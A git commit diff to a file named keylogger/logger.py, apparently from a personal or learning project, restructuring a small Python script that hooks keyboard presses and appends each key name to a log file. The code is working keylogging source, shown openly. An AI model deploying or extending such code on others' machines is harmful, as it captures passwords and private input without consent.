c3e413ce85cd901c01b19482752927128c9fe79e
mollywashere <65878115+mollywashere@users.noreply.github.com>
2024-07-09 13:51:12 -0400

    Update logger.py

--- projects/keylogger/logger.py
+++ projects/keylogger/logger.py
@@ -6,6 +6,10 @@ def on_key_press(event):
     with open(log_file, 'a') as f:
         f.write('{}\n'.format(event.name))
 
-keyboard.on_press(on_key_press)
+def run_script():
+    while True:
+        keyboard.on_press(on_key_press)
+        keyboard.wait()
 
-keyboard.wait()
+if __name__ == "__main__":
+    run_script()
